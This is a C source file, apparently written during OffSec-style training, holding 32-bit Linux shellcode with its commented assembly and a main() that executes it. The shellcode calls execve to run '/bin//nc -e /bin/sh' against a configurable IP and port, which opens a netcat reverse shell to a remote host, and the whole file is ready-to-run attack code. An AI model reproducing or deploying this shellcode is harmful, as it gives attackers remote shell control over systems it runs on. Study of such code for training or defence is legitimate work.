#include <stdio.h>
#include <string.h>

//eben_s_dowling@georgiasouthern.edu
//OffSec ID: OS-20614

/*
global _start
	
_start:
	
;/bin//nc -e///bin/sh 10.0.0.6 99

	xor eax,eax	  ; clear eax
	xor edx,edx	  ; clear edi
	
	; 0xIN-LAST 	IN-FIRST	

	push 0x39393939
	mov esi, esp  ; port in 4 hex bytes


push eax	  ; push null ------------

	jmp short ipADDR			
	continue:
	pop edi	  ; ipADDR

push eax	  ; push null ------------


	push 0x68732F6E 
	push 0x69622F2F   ; //bin/sh
	push 0x2F2F652D	  ; -e//
	mov ecx, esp


push eax	  ; push null ------------
	
	push 0x636e2f2f	  ; 
	push 0x6e69622f	  ; push /bin		
	mov ebx, esp	  ; mov /bin//nc 	


push eax	  ; push null -----------


;--------------FIRST PUSH FINISHED------------------------	

	push esi	  ; push port
	push edi	  ; push ipADDR		
	push ecx	  ; push -e////bin/sh
	push ebx  	  ; push /bin//nc 

;--------------SECOND PUSH FINISHED------------------------
	
	xor ecx, ecx
	xor edx, edx

;--------------REGISTERS CLEARED FOR EXECVE----------------
	mov  ecx,esp	  ; mov /bin//nc > ecx	ecx = long pointer
	mov al,0x0b	  ; execve syscall
	int 0x80          ; syscall

ipADDR:
	call continue
	db "10.0.0.6"
*/

#define PORT "\x39\x39\x39\x39" //port = 9999
/*To keep this shellcode at 52 bytes,
limit the port to 4 bytes*/
#define ipADDR "\x31\x30\x2e\x30\x2e\x30\x2e\x36" //IP = 10.0.0.6
//Both the IP & PORT are converted from ascii to hex



unsigned char shellcode[] = 
                               // <_start>
"\x31\xc0"                     // xor    %eax,%eax
"\x31\xd2"                     // xor    %edx,%edx
"\x68"PORT	               // push   $0x39393939
"\x89\xe6"                     // mov    %esp,%esi
"\x50"                         // push   %eax
"\xeb\x2f"                     // jmp    804809d <ipADDR>
                               // <continue>
"\x5f"                         // pop    %edi
"\x50"                         // push   %eax
"\x68\x6e\x2f\x73\x68"         // push   $0x68732f6e
"\x68\x2f\x2f\x62\x69"         // push   $0x69622f2f
"\x68\x2d\x65\x2f\x2f"         // push   $0x2f2f652d
"\x89\xe1"                     // mov    %esp,%ecx
"\x50"                         // push   %eax
"\x68\x2f\x2f\x6e\x63"         // push   $0x636e2f2f
"\x68\x2f\x62\x69\x6e"         // push   $0x6e69622f
"\x89\xe3"                     // mov    %esp,%ebx
"\x50"                         // push   %eax
"\x56"                         // push   %esi
"\x57"                         // push   %edi
"\x51"                         // push   %ecx
"\x53"                         // push   %ebx
"\x31\xc9"                     // xor    %ecx,%ecx
"\x31\xd2"                     // xor    %edx,%edx
"\x89\xe1"                     // mov    %esp,%ecx
"\xb0\x0b"                     // mov    $0xb,%al
"\xcd\x80"                     // int    $0x80
                               // <ipADDR>
"\xe8\xcc\xff\xff\xff"         // call   804806e <continue>
 ipADDR

;


int main(void)
{
    printf("Shellcode length: %d\n", strlen(shellcode));
    (*(void(*)(void))shellcode)();
    return 0;
}
